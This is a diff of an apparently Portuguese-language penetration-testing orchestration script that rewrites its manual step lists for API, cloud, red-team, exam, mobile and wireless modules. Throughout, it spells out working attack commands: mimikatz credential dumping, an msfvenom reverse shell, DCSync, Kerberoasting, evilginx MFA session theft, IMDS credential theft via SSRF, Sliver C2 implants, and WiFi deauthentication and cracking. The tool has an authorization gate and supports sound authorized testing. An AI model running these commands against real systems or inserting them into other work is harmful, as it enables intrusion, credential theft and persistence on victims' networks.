     # se algum spec OpenAPI/Swagger ficou exposto, baixa e extrai os
     # endpoints REAIS de dentro dele -- isso e o melhor caso possivel pros
     # comandos do M6B.2+ abaixo: endpoint de verdade, nao chute nenhum
     real_api_endpoints = []
     for h in hits:
-        spec_url = h.split()[1] if len(h.split()) > 1 else None
+        spec_url = h["path"]
         if not spec_url:
             continue
         full_spec_url = url.rstrip("/") + spec_url if spec_url.startswith("/") else spec_url
@@ -1625,63 +1842,71 @@ def module_api(domain, url, active, log, findings, workdir, threads=20):
         ex1 = real_api_endpoints[0]
         ex2 = real_api_endpoints[1] if len(real_api_endpoints) > 1 else real_api_endpoints[0]
         lista_endpoints = ", ".join(real_api_endpoints)
-        passo_intro = (
-            f"M6B.1: o spec exposto foi baixado e parseado -- {len(real_api_endpoints)} endpoint(s) "
-            f"REAL(IS) extraido(s): {lista_endpoints} . Os comandos abaixo ja usam um deles de exemplo "
-            f"({ex1}), troque pro endpoint que fizer sentido pro teste. Tambem confira "
-            f"recon/arjun_api.txt pra parametros ocultos adicionais"
-        )
-        passo_bola = (
-            f"M6B.2: BOLA -- autentique como usuario A e B, pegue o ID de um objeto do A, e com o "
-            f"token do B tente acessar: `curl {url}{ex1}/<id_do_objeto_de_A> -H \"Authorization: "
-            f"Bearer $TOK_B\"` (se retornar 200 com o dado de A, e BOLA confirmado). Pra testar um "
-            f"range inteiro: `ffuf -u {url}{ex1}/FUZZ -w ids.txt -H \"Authorization: Bearer "
-            f"$TOK_B\" -mc 200`"
-        )
-        passo_mass = (
-            f"M6B.3/M6B.4: mass assignment -- pegue o body real de um PATCH/PUT legitimo em "
-            f"{ex2} (Burp) e acrescente um campo que a API nao deveria aceitar do cliente: "
-            f"`curl -X PATCH {url}{ex2} -H \"Authorization: Bearer $TOK\" "
-            f"-H \"Content-Type: application/json\" -d '{{\"role\":\"admin\",\"isAdmin\":true}}'` "
-            f"(testar 1 campo suspeito por vez, confirmar no GET seguinte se o valor realmente mudou)"
-        )
-        passo_webhook = (
-            f"M6B.8: webhook/SSRF -- dentre os endpoints reais acima, ache o que aceita URL "
-            f"(callback, webhook, avatar por URL, import por URL) e aponte pro seu Burp Collaborator: "
-            f"`curl {url}<endpoint_com_campo_de_url> -d 'callback_url=http://SEU_ID.burpcollaborator.net/'` "
-            f"depois confira o painel do Collaborator por hit (ver Modulo 11.10 do guia)"
-        )
+        rec_real = ex1          # endpoint real pros exemplos
+        rec_mass = ex2
+        nota_endpoints = (f"O spec exposto foi baixado e parseado: {len(real_api_endpoints)} endpoint(s) "
+                          f"REAL(IS) extraido(s): {lista_endpoints}. Os comandos abaixo ja usam `{ex1}`/`{ex2}` "
+                          f"de exemplo — troque pelo endpoint que fizer sentido. Veja tambem recon/arjun_api.txt (parametros ocultos).")
     else:
-        passo_intro = (
-            "M6B.1: nenhum spec (swagger/openapi) ficou exposto nem foi possivel parsear -- os "
-            "endpoints reais da API nao sao conhecidos por recon passivo. Confira recon/arjun_api.txt "
-            "(parametros ocultos achados) e navegue a aplicacao manualmente (Burp proxy ligado) pra "
-            "mapear os endpoints de verdade antes de tentar BOLA/mass assignment -- os comandos abaixo "
-            "sao template generico com <recurso_real> no lugar do endpoint, NAO rode sem substituir"
-        )
-        passo_bola = (
-            f"M6B.2: BOLA -- autentique como usuario A e B, pegue o ID de um objeto do A, e com o "
-            f"token do B tente acessar: `curl {url}/<recurso_real>/<id_do_objeto_de_A> -H "
-            f"\"Authorization: Bearer $TOK_B\"` (se retornar 200 com o dado de A, e BOLA confirmado)"
-        )
-        passo_mass = (
-            f"M6B.3/M6B.4: mass assignment -- pegue o body real de um PATCH/PUT legitimo (Burp) e "
-            f"acrescente um campo que a API nao deveria aceitar do cliente: "
-            f"`curl -X PATCH {url}/<recurso_real>/me -H \"Authorization: Bearer $TOK\" "
-            f"-H \"Content-Type: application/json\" -d '{{\"role\":\"admin\",\"isAdmin\":true}}'`"
-        )
-        passo_webhook = (
-            f"M6B.8: webhook/SSRF -- ache um campo que aceita URL (callback, webhook, avatar por "
-            f"URL) e aponte pro seu Burp Collaborator: "
-            f"`curl {url}/<endpoint_real> -d 'callback_url=http://SEU_ID.burpcollaborator.net/'` "
-            f"depois confira o painel do Collaborator por hit (ver Modulo 11.10 do guia)"
-        )
+        ex1 = ex2 = rec_real = rec_mass = "/<recurso_real>"
+        nota_endpoints = ("Nenhum spec (swagger/openapi) ficou exposto — os endpoints reais nao sao conhecidos por "
+                          "recon passivo. Navegue a API com o Burp ligado (e veja recon/arjun_api.txt) pra mapear os "
+                          "endpoints reais ANTES de rodar; os comandos abaixo tem `<recurso_real>` de placeholder, NAO rode sem substituir.")
 
     manual_steps = [
-        passo_intro, passo_bola, passo_mass,
-        f"M6B.7: kid injection em JWT -- `python3 jwt_tool.py $TOK -X k -pk mykey.pem` "
-        f"(github.com/ticarpi/jwt_tool, precisa gerar/ter uma chave propria em mykey.pem)",
-        passo_webhook,
+        manual_step(
+            "M6B.1 — Mapa dos endpoints da API",
+            objetivo="ter os endpoints reais antes de testar BOLA/mass assignment.",
+            passos=[nota_endpoints],
+        ),
+        manual_step(
+            "M6B.2 — Confirmar BOLA (acesso a objeto de outro usuario)",
+            objetivo="se o token do usuario B acessa um objeto do usuario A.",
+            prereqs="DUAS contas (A e B) e os tokens Bearer de cada uma · curl · ffuf (pra testar em massa).",
+            passos=[
+                "Logado como A, pegue o ID de um objeto do A (ex.: seu proprio pedido/perfil).",
+                (f"Com o token do B, tente acessar o objeto do A:",
+                 f'curl {url}{rec_real}/<id_do_objeto_de_A> -H "Authorization: Bearer $TOK_B"',
+                 "BOLA confirmado se retornar 200 com os DADOS do A. 403/404 = protegido."),
+                ("Pra testar um range inteiro de IDs de uma vez:",
+                 f'ffuf -u {url}{rec_real}/FUZZ -w ids.txt -H "Authorization: Bearer $TOK_B" -mc 200',
+                 "cada 200 e um objeto de outro usuario acessivel = BOLA em massa."),
+            ],
+        ),
+        manual_step(
+            "M6B.3/M6B.4 — Confirmar Mass Assignment",
+            objetivo="se da pra setar um campo privilegiado que a API nao deveria aceitar do cliente.",
+            prereqs="um token valido · Burp pra ver o body legitimo de um PATCH/PUT.",
+            passos=[
+                f"No Burp, capture um PATCH/PUT legitimo em `{rec_mass}` e veja o JSON do body.",
+                ("Reenvie acrescentando um campo suspeito (teste 1 por vez: role, isAdmin, is_staff, verified...):",
+                 f'curl -X PATCH {url}{rec_mass} -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d \'{{"role":"admin","isAdmin":true}}\'',
+                 "confirmado se o GET seguinte no mesmo objeto mostrar que o campo REALMENTE mudou (ex.: virou admin)."),
+            ],
+        ),
+        manual_step(
+            "M6B.7 — JWT kid injection / confusao de algoritmo",
+            objetivo="se o backend aceita um JWT forjado (kid injection, alg=none, HS/RS confusion).",
+            prereqs="jwt_tool (`git clone github.com/ticarpi/jwt_tool`) · um token JWT valido · uma chave sua (mykey.pem).",
+            passos=[
+                ("Teste kid injection apontando o header kid pra uma chave que voce controla:",
+                 "python3 jwt_tool.py $TOK -X k -pk mykey.pem",
+                 "se o servidor aceitar o token assinado com a SUA chave, da pra forjar qualquer claim (ex.: virar admin)."),
+                ("Teste tambem alg=none e confusao HS256/RS256:",
+                 "python3 jwt_tool.py $TOK -X a   # alg none\npython3 jwt_tool.py $TOK -X k -pk chave_publica.pem   # RS->HS confusion"),
+            ],
+        ),
+        manual_step(
+            "M6B.8 — SSRF via webhook/callback",
+            objetivo="se algum campo que recebe URL faz o servidor chamar um destino seu.",
+            prereqs="Burp Collaborator (ou um listener publico seu) · o endpoint que aceita URL.",
+            passos=[
+                "Ache o endpoint/campo que recebe URL (callback, webhook, avatar-por-URL, import-por-URL) entre os endpoints reais acima.",
+                ("Aponte esse campo pro seu Collaborator e dispare:",
+                 f'curl {url}<endpoint_com_campo_de_url> -d \'callback_url=http://SEU_ID.burpcollaborator.net/\'',
+                 "SSRF confirmado se o painel do Collaborator registrar um hit vindo do IP do servidor da API (ver Modulo 11.10 do guia)."),
+            ],
+        ),
     ]
     return manual_steps
 
@@ -1750,15 +1975,49 @@ def module_cloud(provider, log, findings, workdir, aws_profile=None):
                     log.warn(f"  {n} projeto(s) GCP enumerado(s)")
 
     manual_steps = [
-        f"M4.3: Pacu interativo -- `pacu` depois `set_keys` (cole a credencial), `run "
-        f"iam__enum_permissions`, `run iam__privesc_scan` (mapeia caminho de escalonamento automatico)",
-        "M4.4: trufflehog nos buckets/repos achados -- `trufflehog s3 --bucket=<nome_do_bucket>` ou "
-        "`trufflehog git <url_do_repo>` (precisa da lista de buckets/repos primeiro, ver enum/)",
-        "M4.7: testar IMDSv1 bypass -- a partir de uma app comprometida com SSRF, "
-        "`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` "
-        "(so funciona de dentro da rede da cloud, nao daqui)",
-        "M4.8: container/Kubernetes escape -- exige shell no host/pod primeiro (ex.: "
-        "`kubectl auth can-i --list` depois de ja ter acesso a um pod), nao e recon remoto",
+        manual_step(
+            "M4.3 — Pacu (privesc na conta cloud)",
+            objetivo="mapear caminhos de escalada de privilegio automaticamente.",
+            prereqs="pacu (`pip install pacu`) · a credencial ja enumerada acima.",
+            passos=[
+                "Abra o `pacu` e crie uma sessao.",
+                ("Cole a credencial e rode os modulos de enum/privesc:",
+                 "set_keys          # cole Access Key / Secret\nrun iam__enum_permissions\nrun iam__privesc_scan",
+                 "o `iam__privesc_scan` lista caminhos concretos de escalada (ex.: iam:PassRole + lambda)."),
+            ],
+        ),
+        manual_step(
+            "M4.4 — trufflehog (segredos em buckets/repos)",
+            objetivo="achar credenciais vazadas nos buckets/repos da conta.",
+            prereqs="trufflehog · a lista de buckets/repos (ver pasta enum/).",
+            passos=[
+                ("Varra um bucket:",
+                 "trufflehog s3 --bucket=<nome_do_bucket>"),
+                ("Ou um repo git:",
+                 "trufflehog git <url_do_repo>",
+                 "cada hit 'verified' e uma credencial viva vazada."),
+            ],
+        ),
+        manual_step(
+            "M4.7 — IMDS bypass (roubo de credencial via SSRF)",
+            objetivo="pegar credencial temporaria da role da instancia via metadata.",
+            prereqs="uma app na cloud com SSRF (so funciona de DENTRO da rede da cloud, nao daqui).",
+            passos=[
+                ("A partir do SSRF, chame o endpoint de metadata:",
+                 "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                 "liste a role, depois pegue a credencial em .../security-credentials/<ROLE> e use com `aws --profile`."),
+            ],
+        ),
+        manual_step(
+            "M4.8 — Container / Kubernetes escape",
+            objetivo="sair de um pod/container pro host.",
+            prereqs="ja ter shell num pod/container (nao e recon remoto).",
+            passos=[
+                ("De dentro do pod, veja o que o service account pode fazer:",
+                 "kubectl auth can-i --list",
+                 "procure permissoes perigosas (create pods, exec, secrets) pra pivotar ou ler segredos do cluster."),
+            ],
+        ),
     ]
     return manual_steps
 
@@ -1818,23 +2077,60 @@ def module_redteam(domain, log, findings, workdir, apt_group=None):
                f"perfil: {group_sector}")
 
     manual_steps = [
-        "M3.2: setup de C2 -- `sliver-server` depois `generate --http <redirector_ip> --save impl.bin` "
-        "(redirector dedicado, infra separada da sua maquina de dev, nunca C2 direto no IP real)",
-        f"M3.3: phishing/acesso inicial (T1566) -- `gophish` (painel web) ou `evilginx3` pra "
-        f"capturar sessao com MFA, alvo: {domain} (exige autorizacao explicita no ROE)",
-        "M3.4: evasao de defesa (T1562) -- checar AMSI com `[Ref].Assembly.GetType('System.Management"
-        ".Automation.AmsiUtils')` no PowerShell antes de qualquer payload; LOTL com binarios "
-        "already-trusted (ver lolbas-project.github.io)",
-        "M3.5: pos-exploracao -- `mimikatz` (`sekurlsa::logonpasswords`) ou "
-        "`impacket-wmiexec dominio/user:senha@IP_ALVO` pra movimento lateral, a partir da sessao C2",
-        f"M3.6: emulacao da cadeia de TTPs mapeada no M3.1 (ver recon/{ttp_file.name}) -- "
-        f"`Invoke-AtomicTest T1055 -ShowDetailsBrief` pra cada tecnica da lista, em sequencia",
-        "M3.6B: Caldera pra emulacao automatizada -- `python3 server.py --insecure` depois acessar "
-        "localhost:8888 e montar a adversary profile com as TTPs do M3.1",
-        "M3.7: Purple team -- cruzar timestamp de cada tecnica executada com os alertas que o SIEM "
-        "do cliente gerou (ou nao gerou), nao automatizavel daqui",
-        "M3.8: OPSEC e limpeza -- revisar `history`/Prefetch/Event Logs criados, remover implante "
-        "(`kill` na sessao C2) e qualquer persistencia (scheduled task, registry run key) antes de encerrar",
+        manual_step(
+            "M3.2 — Setup de C2",
+            objetivo="ter um canal de comando e controle com redirector.",
+            prereqs="Sliver (ou Cobalt Strike/Mythic) · um redirector dedicado (infra separada da sua maquina, NUNCA C2 no IP real).",
+            passos=[
+                ("Suba o servidor e gere o implante apontando pro redirector:",
+                 "sliver-server\ngenerate --http <redirector_ip> --save impl.bin"),
+            ],
+        ),
+        manual_step(
+            "M3.3 — Phishing / acesso inicial (T1566)",
+            objetivo="obter a primeira sessao/credencial.",
+            prereqs=f"gophish ou evilginx3 · autorizacao EXPLICITA de phishing no ROE · alvo: {domain}.",
+            passos=[
+                "gophish pro envio/landing page, ou evilginx3 pra capturar sessao mesmo com MFA (reverse proxy que rouba o cookie de sessao).",
+            ],
+        ),
+        manual_step(
+            "M3.4 — Evasao de defesa (T1562)",
+            objetivo="rodar payload sem ser bloqueado por AV/EDR/AMSI.",
+            passos=[
+                ("Cheque o estado do AMSI antes de qualquer payload PowerShell:",
+                 "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"),
+                "Prefira LOTL (living-off-the-land) com binarios ja confiaveis do sistema — veja lolbas-project.github.io.",
+            ],
+        ),
+        manual_step(
+            "M3.5 — Pos-exploracao / movimento lateral",
+            objetivo="extrair credenciais e pivotar, a partir da sessao C2.",
+            passos=[
+                ("Dump de credenciais na maquina comprometida:",
+                 "mimikatz # sekurlsa::logonpasswords"),
+                ("Movimento lateral com credencial obtida:",
+                 "impacket-wmiexec <dominio>/<user>:<senha>@<IP_ALVO>"),
+            ],
+        ),
+        manual_step(
+            "M3.6 — Emulacao da cadeia de TTPs mapeada",
+            objetivo="executar as TTPs do grupo escolhido em sequencia.",
+            prereqs=f"Atomic Red Team · a lista de TTPs em recon/{ttp_file.name}.",
+            passos=[
+                ("Pra cada tecnica da lista, veja o teste e execute:",
+                 "Invoke-AtomicTest T1055 -ShowDetailsBrief   # troque T1055 por cada TTP da lista"),
+                "Alternativa automatizada: Caldera (`python3 server.py --insecure`, acesse localhost:8888 e monte a adversary profile com as TTPs do M3.1).",
+            ],
+        ),
+        manual_step(
+            "M3.7/M3.8 — Purple team e limpeza (OPSEC)",
+            objetivo="medir deteccao e nao deixar rastro.",
+            passos=[
+                "Purple team: cruze o timestamp de cada tecnica executada com os alertas que o SIEM do cliente gerou (ou nao) — mostra os gaps de deteccao.",
+                "Limpeza: revise history/Prefetch/Event Logs criados, mate o implante (`kill` na sessao C2) e remova qualquer persistencia (scheduled task, registry run key) antes de encerrar.",
+            ],
+        ),
     ]
     return manual_steps
 
@@ -1979,26 +2275,79 @@ def module_dcpt(domain, ip, log, findings, workdir):
     log.warn("Este modulo so roda recon por isso -- exploracao e 100% manual, igual o exame exige.")
 
     manual_steps = [
-        f"M7.7: SQLi manual (sem sqlmap) -- este modulo so faz recon de rede/AD, NAO navegou a "
-        f"aplicacao web do alvo, entao nao ha path/parametro real conhecido ainda. Ache uma URL "
-        f"real com parametro navegando a aplicacao (Burp proxy ligado) e so entao teste, ex. de "
-        f"sintaxe (troque <caminho_real>?<param_real>=1 pelo que voce encontrar de verdade): "
-        f"`curl \"http://{target}/<caminho_real>?<param_real>=1%27%20or%201=1--%20-\"` pra validar, "
-        f"depois `ORDER BY N-- -` ate quebrar (acha o numero de colunas), `UNION SELECT NULL,...-- -`",
-        "M7.8: Buffer Overflow -- `python3 -c \"print('A'*3000)\"` (fuzzing) -> "
-        "`pattern_create.rb -l 3000` -> enviar -> ler EIP -> `pattern_offset.rb -q <EIP>` -> "
-        "`!mona bytearray`/`!mona compare` (badchars) -> `!mona jmp -r esp` -> msfvenom com o shellcode",
-        f"M7.10: AS-REP Roasting -- `impacket-GetNPUsers <dominio>/ -usersfile users.txt -no-pass "
-        f"-dc-ip {target} -outputfile asrep.txt` depois `hashcat -m 18200 asrep.txt rockyou.txt`",
-        f"M7.10: Kerberoasting (exige credencial) -- `impacket-GetUserSPNs <dominio>/<user>:<pass> "
-        f"-dc-ip {target} -request -outputfile kerb.txt` depois `hashcat -m 13100 kerb.txt rockyou.txt`",
-        f"M7.10: cadeia pos-credencial -- `impacket-secretsdump <dominio>/<user>:<pass>@{target} "
-        f"-just-dc` (DCSync) e `bloodhound-python -u <user> -p <pass> -d <dominio> -ns {target} -c All`, "
-        f"so depois de ja ter pelo menos 1 credencial valida",
-        "M7.11: escalacao de privilegio -- `sudo -l`, `find / -perm -4000 -type f 2>/dev/null` (Linux); "
-        "`whoami /priv` + rodar winPEAS.exe (Windows) e usar a tabela de vetores do guia (M7.11): "
-        "unquoted service path, servico modificavel (`icacls`), AlwaysInstallElevated, tokens "
-        "(*Potato), credenciais salvas (`cmdkey /list`), autologon no registro",
+        manual_step(
+            "M7.7 — SQLi manual (sem sqlmap, regra da DCPT)",
+            objetivo="confirmar SQLi na mao, sem ferramenta de auto-exploit.",
+            prereqs="uma URL real com parametro (este modulo so fez recon de REDE/AD, nao navegou a web — ache a URL no Burp primeiro).",
+            passos=[
+                ("Teste um payload boolean simples na URL real (troque <caminho_real>/<param_real>):",
+                 f'curl "http://{target}/<caminho_real>?<param_real>=1%27%20or%201=1--%20-"',
+                 "injetavel se a resposta mudar vs. a normal (ex.: lista mais itens, ou some o erro)."),
+                "Ache o numero de colunas aumentando o N em `ORDER BY N-- -` ate dar erro.",
+                "Com o numero de colunas, extraia dados via `UNION SELECT NULL,NULL,...-- -` trocando os NULL por version()/user()/table_name.",
+            ],
+        ),
+        manual_step(
+            "M7.8 — Buffer Overflow (stack clássico)",
+            objetivo="controlar o EIP de um servico vulneravel e executar shellcode.",
+            prereqs="Immunity Debugger + mona.py no alvo Windows · metasploit (pattern_create/offset) · msfvenom.",
+            passos=[
+                ("Fuzzing — mande strings crescentes ate crashar o servico:",
+                 "python3 -c \"print('A'*3000)\""),
+                ("Ache o offset exato do EIP:",
+                 "pattern_create.rb -l 3000   # envie, leia o EIP no debugger, depois:\npattern_offset.rb -q <EIP_lido>"),
+                "Ache os badchars com `!mona bytearray` + `!mona compare`, depois um `JMP ESP` com `!mona jmp -r esp`.",
+                ("Gere o shellcode (sem os badchars) e monte o exploit final:",
+                 "msfvenom -p windows/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -b '\\x00...' -f python"),
+            ],
+        ),
+        manual_step(
+            "M7.10 — AS-REP Roasting",
+            objetivo="pegar hash de contas com pre-auth Kerberos desabilitada (crackavel offline).",
+            prereqs="impacket · hashcat · users.txt · o DC abaixo.",
+            passos=[
+                ("Peca os AS-REP das contas sem pre-auth (NAO precisa de credencial):",
+                 f"impacket-GetNPUsers <dominio>/ -usersfile users.txt -no-pass -dc-ip {target} -outputfile asrep.txt",
+                 "se vier hash `$krb5asrep$...`, da pra crackar offline."),
+                ("Cracke o hash:",
+                 "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"),
+            ],
+        ),
+        manual_step(
+            "M7.10 — Kerberoasting",
+            objetivo="pegar hash de contas de servico (SPN) pra crackar offline.",
+            prereqs="1 credencial de dominio valida · impacket · hashcat.",
+            passos=[
+                ("Peca os tickets de servico (precisa de credencial valida):",
+                 f"impacket-GetUserSPNs <dominio>/<user>:<pass> -dc-ip {target} -request -outputfile kerb.txt"),
+                ("Cracke:",
+                 "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt"),
+            ],
+        ),
+        manual_step(
+            "M7.10 — Cadeia pos-credencial (DCSync / BloodHound)",
+            objetivo="escalar ate Domain Admin depois de ter 1 credencial.",
+            prereqs="pelo menos 1 credencial de dominio valida · impacket · bloodhound-python.",
+            passos=[
+                ("Mapeie caminhos de escalada no dominio:",
+                 f"bloodhound-python -u <user> -p <pass> -d <dominio> -ns {target} -c All",
+                 "abra no BloodHound e rode as queries de 'shortest path to Domain Admins'."),
+                ("Se a conta tiver direito de replicacao, faca DCSync (dump de hashes do dominio):",
+                 f"impacket-secretsdump <dominio>/<user>:<pass>@{target} -just-dc"),
+            ],
+        ),
+        manual_step(
+            "M7.11 — Escalacao de privilegio local",
+            objetivo="virar root/SYSTEM na maquina ja comprometida.",
+            passos=[
+                ("Linux — enumere vetores:",
+                 "sudo -l\nfind / -perm -4000 -type f 2>/dev/null",
+                 "procure binario SUID explorável (GTFOBins) ou sudo mal configurado."),
+                ("Windows — enumere com winPEAS e cheque privilegios:",
+                 "whoami /priv   # + rode winPEAS.exe",
+                 "vetores comuns (ver tabela M7.11 do guia): unquoted service path, servico modificavel (icacls), AlwaysInstallElevated, tokens (*Potato), cmdkey /list, autologon no registro."),
+            ],
+        ),
     ]
     return manual_steps
 
@@ -2073,17 +2422,51 @@ def module_mobile(apk_path, log, findings, workdir):
         nota_pkg = "apktool NAO rodou ou nao extraiu o manifest -- substitua <package_name> manualmente (abra AndroidManifest.xml ou use aapt dump badging pra achar o pacote real)"
 
     manual_steps = [
-        f"M5.3: instrumentacao dinamica -- {nota_pkg}. Instale o APK, depois explore com objection "
-        f"(ou frida como alternativa), precisa de device/emulador rodando: "
-        f"`adb install {apk_path}` `objection -g {pkg} explore` `frida -U -l script.js -f {pkg}`",
-        f"M5.4: Drozer pra IPC -- lista activities/providers/receivers exportados, precisa de "
-        f"device via adb: `drozer console connect` `run app.package.attacksurface {pkg}`",
-        "M5.5: iOS exige jailbreak + frida-ios-dump, nao automatizavel so com o IPA (bundle ID "
-        "nao e extraivel de um APK Android, so de um IPA real): `python3 dump.py <bundle_id>`",
-        f"M5.6: checar dados salvos (Android, pacote real {pkg}) -- precisa de device/emulador "
-        f"com o app instalado: `adb shell run-as {pkg} cat shared_prefs/*.xml`",
-        "M5.6 (iOS): checar Keychain via objection, precisa de device/emulador com o app "
-        "instalado e --bundle_id do IPA real (nao extraivel de um APK): `ios keychain dump`",
+        manual_step(
+            "M5.3 — Instrumentacao dinamica (frida/objection)",
+            objetivo="hookar o app em runtime (bypass de root/SSL pinning, inspecao de chamadas).",
+            prereqs=f"device/emulador Android com adb · frida-server rodando no device · {nota_pkg}",
+            passos=[
+                ("Instale o APK no device:",
+                 f"adb install {apk_path}"),
+                ("Explore com objection (mais amigavel):",
+                 f"objection -g {pkg} explore",
+                 "dentro do objection: `android sslpinning disable`, `android root disable`, `android hooking list classes`."),
+                ("Ou use frida direto com um script seu:",
+                 f"frida -U -l script.js -f {pkg}"),
+            ],
+        ),
+        manual_step(
+            "M5.4 — Superficie de IPC (Drozer)",
+            objetivo="achar activities/providers/receivers exportados exploraveis.",
+            prereqs="device via adb · Drozer agent instalado no device.",
+            passos=[
+                ("Conecte e liste a superficie de ataque do app:",
+                 f"drozer console connect\nrun app.package.attacksurface {pkg}",
+                 "componentes 'exported' sao chamaveis por outros apps — teste content providers (SQLi/path traversal) e activities (intents maliciosas)."),
+            ],
+        ),
+        manual_step(
+            "M5.6 — Dados salvos localmente (Android)",
+            objetivo="achar segredos/tokens guardados em claro no device.",
+            prereqs=f"device/emulador com o app ({pkg}) instalado e ja usado (logado).",
+            passos=[
+                ("Leia os shared_prefs do app:",
+                 f"adb shell run-as {pkg} cat shared_prefs/*.xml",
+                 "procure token/senha/PII em claro; cheque tambem databases/ e files/ do mesmo diretorio."),
+            ],
+        ),
+        manual_step(
+            "M5.5 — iOS (quando for um IPA, nao este APK)",
+            objetivo="analise dinamica no iOS.",
+            passos=[
+                "iOS exige device com jailbreak. O bundle ID NAO e extraivel de um APK Android (so de um IPA real).",
+                ("Dump do app descriptografado:",
+                 "python3 dump.py <bundle_id>   # frida-ios-dump"),
+                ("Inspecionar o Keychain:",
+                 "ios keychain dump   # via objection, com o device/app conectados"),
+            ],
+        ),
     ]
     return manual_steps
 
@@ -2109,12 +2492,38 @@ def module_wireless(iface, log, findings, workdir):
     log.warn("Isso exige interacao em tempo real, nao faz sentido automatizar as cegas.")
 
     manual_steps = [
-        f"M6.1: `airodump-ng {iface}mon` pra listar redes e escolher o BSSID/canal alvo",
-        f"M6.2: `airodump-ng -c <canal> --bssid <BSSID> -w captura {iface}mon` (captura) + "
-        f"`aireplay-ng --deauth 5 -a <BSSID> {iface}mon` (forca handshake) + "
-        f"`hashcat -m 22000 captura.hccapx /usr/share/wordlists/rockyou.txt` (crack)",
-        f"M6.3: `reaver -i {iface}mon -b <BSSID> -vv` ou `bully {iface}mon -b <BSSID>` pra WPS, se aplicavel",
-        "Deauth so com autorizacao explicita no ROE (ver checklist do Modulo 6)",
+        manual_step(
+            "M6.1 — Escolher a rede alvo",
+            objetivo="ver as redes ao alcance e escolher BSSID + canal.",
+            prereqs=f"modo monitor ativo em {iface}mon (confirme com `iwconfig`).",
+            passos=[
+                (f"Liste as redes e anote o BSSID e o canal (CH) do alvo:",
+                 f"airodump-ng {iface}mon"),
+            ],
+        ),
+        manual_step(
+            "M6.2 — Capturar handshake e crackar (WPA2)",
+            objetivo="pegar o handshake e quebrar a senha offline.",
+            prereqs="aircrack-ng · hashcat · o BSSID/canal do passo M6.1 · autorizacao EXPLICITA de deauth no ROE.",
+            passos=[
+                (f"Comece a captura travada no canal/BSSID do alvo:",
+                 f"airodump-ng -c <canal> --bssid <BSSID> -w captura {iface}mon"),
+                (f"Em OUTRO terminal, force um deauth pra capturar o handshake (poucos pacotes):",
+                 f"aireplay-ng --deauth 5 -a <BSSID> {iface}mon",
+                 "o airodump mostra 'WPA handshake: <BSSID>' no topo quando captura."),
+                ("Converta e cracke o handshake offline:",
+                 "hashcat -m 22000 captura.hccapx /usr/share/wordlists/rockyou.txt",
+                 "se crackar, a senha aparece ao lado do hash."),
+            ],
+        ),
+        manual_step(
+            "M6.3 — WPS (se aplicavel)",
+            objetivo="quebrar o PIN WPS (mais rapido que brute de senha, quando ativo).",
+            passos=[
+                ("Ataque de PIN WPS:",
+                 f"reaver -i {iface}mon -b <BSSID> -vv   # ou: bully {iface}mon -b <BSSID>"),
+            ],
+        ),
     ]
     return manual_steps
 
@@ -2276,7 +2685,7 @@ def main():
     ap.add_argument("--iface", help="interface wifi, ex.: wlan0 (modulo wireless)")
     ap.add_argument("--active", action="store_true",
                      help="habilita deteccao ativa (nuclei completo, dalfox, sqlmap em modo deteccao)")
-    ap.add_argument("-o", "--outdir", help="pasta de saida (default: ~/pentest/<modulo>/<alvo>)")
+    ap.add_argument("-o", "--outdir", help="pasta de saida (default: RESULTADOS/<modulo>/<alvo> ao lado do script)")
     ap.add_argument("--skip-auth-gate", action="store_true",
                      help="(uso interno/CI apenas) pula a confirmacao interativa de autorizacao")
     args = ap.parse_args()
@@ -2299,7 +2708,7 @@ def main():
         authorization_gate(label, MODULES[module], args.active, skip=args.skip_auth_gate)
 
         batch_workdir = (Path(args.outdir) if args.outdir
-                          else Path.home() / "pentest" / module / f"lote_{Path(args.urls_file).stem}")
+                          else OUTPUT_BASE / module / f"lote_{Path(args.urls_file).stem}")
         batch_workdir.mkdir(parents=True, exist_ok=True)
         batch_log = Log(batch_workdir / "session.log")
         batch_findings = Findings()
